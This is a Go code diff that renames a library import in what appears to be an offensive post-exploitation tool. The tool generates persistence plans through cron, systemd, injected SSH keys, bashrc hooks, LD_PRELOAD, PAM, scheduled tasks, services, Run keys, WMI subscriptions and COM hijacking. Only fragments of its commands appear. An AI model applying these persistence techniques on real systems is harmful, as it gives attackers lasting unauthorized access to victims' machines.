@@ -5,7 +5,7 @@ import (
 	"path/filepath"
 	"strings"
 
-	"github.com/c1ayooo/capkit"
+	"github.com/c1ayooo/capkit/core"
 )
 
 // Step is one command in a plan. Verification is a read-only check the caller
@@ -41,7 +41,7 @@ type technique struct {
 	// needsPayload reports whether the technique invokes a host-supplied
 	// command/path. Techniques that only place a key or a stub do not.
 	needsPayload func() bool
-	build        func(in planInput) (Plan, *capkit.Error)
+	build        func(in planInput) (Plan, *core.Error)
 }
 
 func needsPayloadYes() bool { return true }
@@ -79,7 +79,7 @@ func defaultUser(in planInput) string {
 
 // quote shells a single token for the remote shell. Long payloads are placed in
 // an artifact file instead of being inlined, which keeps the command readable.
-func quote(s string) string { return capkit.ShellQuote(s) }
+func quote(s string) string { return core.ShellQuote(s) }
 
 // writeFileStep builds a step that writes content to a path using printf and a
 // quoted single line, avoiding heredoc/quoting hazards over WebShell/CLI
@@ -96,8 +96,8 @@ func writeFileStep(n int, path, content, desc string) Step {
 
 // ---- Linux techniques ----
 
-func linuxCron(in planInput) (Plan, *capkit.Error) {
-	name := defaultName(in, "com.capkit.update")
+func linuxCron(in planInput) (Plan, *core.Error) {
+	name := defaultName(in, "com.core.update")
 	user := defaultUser(in)
 	sched := strings.TrimSpace(in.Schedule)
 	if sched == "" {
@@ -119,7 +119,7 @@ func linuxCron(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func linuxSystemd(in planInput) (Plan, *capkit.Error) {
+func linuxSystemd(in planInput) (Plan, *core.Error) {
 	name := defaultName(in, "capkit-update")
 	user := defaultUser(in)
 	path := strings.TrimSpace(in.Path)
@@ -154,7 +154,7 @@ WantedBy=multi-user.target
 	}, nil
 }
 
-func linuxSSHKey(in planInput) (Plan, *capkit.Error) {
+func linuxSSHKey(in planInput) (Plan, *core.Error) {
 	user := defaultUser(in)
 	path := strings.TrimSpace(in.Path)
 	if path == "" {
@@ -172,11 +172,11 @@ func linuxSSHKey(in planInput) (Plan, *capkit.Error) {
 			writeFileStep(1, path, entry, "追加公钥到 "+path),
 			{Step: 2, Description: "修正 .ssh 与 authorized_keys 权限", Command: fmt.Sprintf("chmod 700 %s && chmod 600 %s && chown -R %s %s", quote(filepath.Dir(path)), quote(path), quote(user), quote(filepath.Dir(path))), Verify: "tail -n 1 " + quote(path)},
 		},
-		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", capkit.ShellQuote(strings.TrimSpace(in.PublicKey)), quote(path))},
+		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", core.ShellQuote(strings.TrimSpace(in.PublicKey)), quote(path))},
 	}, nil
 }
 
-func linuxBashrc(in planInput) (Plan, *capkit.Error) {
+func linuxBashrc(in planInput) (Plan, *core.Error) {
 	user := defaultUser(in)
 	path := strings.TrimSpace(in.Path)
 	if path == "" {
@@ -195,11 +195,11 @@ func linuxBashrc(in planInput) (Plan, *capkit.Error) {
 			writeFileStep(1, path, content, "追加启动钩子到 "+path),
 			{Step: 2, Description: "确保文件属主正确", Command: "chown " + quote(user) + " " + quote(path), Verify: "tail -n 1 " + quote(path)},
 		},
-		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", capkit.ShellQuote(line), quote(path))},
+		Revert: []string{fmt.Sprintf("sed -i '\\#%s#d' %s", core.ShellQuote(line), quote(path))},
 	}, nil
 }
 
-func linuxLDPreload(in planInput) (Plan, *capkit.Error) {
+func linuxLDPreload(in planInput) (Plan, *core.Error) {
 	path := strings.TrimSpace(in.Path)
 	if path == "" {
 		path = "/etc/ld.so.preload"
@@ -216,7 +216,7 @@ func linuxLDPreload(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func linuxPAM(in planInput) (Plan, *capkit.Error) {
+func linuxPAM(in planInput) (Plan, *core.Error) {
 	path := strings.TrimSpace(in.Path)
 	if path == "" {
 		path = "/etc/pam.d/sshd"
@@ -236,7 +236,7 @@ func linuxPAM(in planInput) (Plan, *capkit.Error) {
 
 // ---- Windows techniques ----
 
-func winSchtasks(in planInput) (Plan, *capkit.Error) {
+func winSchtasks(in planInput) (Plan, *core.Error) {
 	name := defaultName(in, "CapKitUpdate")
 	user := defaultUser(in)
 	interval := strings.TrimSpace(in.Schedule)
@@ -257,7 +257,7 @@ func winSchtasks(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func winService(in planInput) (Plan, *capkit.Error) {
+func winService(in planInput) (Plan, *core.Error) {
 	name := defaultName(in, "CapKitUpdate")
 	path := strings.TrimSpace(in.Path)
 	if path == "" {
@@ -281,7 +281,7 @@ func winService(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func winRegistryRun(in planInput) (Plan, *capkit.Error) {
+func winRegistryRun(in planInput) (Plan, *core.Error) {
 	name := defaultName(in, "CapKitUpdate")
 	key := `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
 	if strings.EqualFold(strings.TrimSpace(in.User), "root") || strings.TrimSpace(in.User) == "" {
@@ -300,7 +300,7 @@ func winRegistryRun(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func winWMISubscription(in planInput) (Plan, *capkit.Error) {
+func winWMISubscription(in planInput) (Plan, *core.Error) {
 	name := defaultName(in, "CapKitUpdate")
 	filter := fmt.Sprintf(`__EventFilter.Name="%s"`, name)
 	consumer := fmt.Sprintf(`CommandLineEventConsumer.Name="%s"`, name)
@@ -320,7 +320,7 @@ func winWMISubscription(in planInput) (Plan, *capkit.Error) {
 	}, nil
 }
 
-func winCOMHijack(in planInput) (Plan, *capkit.Error) {
+func winCOMHijack(in planInput) (Plan, *core.Error) {
 	// 对每个用户可达的 CLSID 路径写入 InprocServer32；默认挑选常见可劫持项之一。
 	clsid := strings.TrimSpace(in.Path)
 	if clsid == "" {
@@ -355,13 +355,13 @@ var techniques = map[string]technique{
 }
 
 // buildPlan validates the input and builds the plan. It never touches a target.
-func buildPlan(in planInput) (Plan, *capkit.Error) {
+func buildPlan(in planInput) (Plan, *core.Error) {
 	if e := in.validate(); e != nil {
 		return Plan{}, e
 	}
 	t := techniques[strings.ToLower(strings.TrimSpace(in.Technique))]
 	if t.Platform != in.Platform {
-		return Plan{}, capkit.InvalidInput(fmt.Sprintf("technique %s 仅支持 %s 平台（会话为 %s）", t.ID, t.Platform, in.Platform))
+		return Plan{}, core.InvalidInput(fmt.Sprintf("technique %s 仅支持 %s 平台（会话为 %s）", t.ID, t.Platform, in.Platform))
 	}
 	return t.build(in)
 }
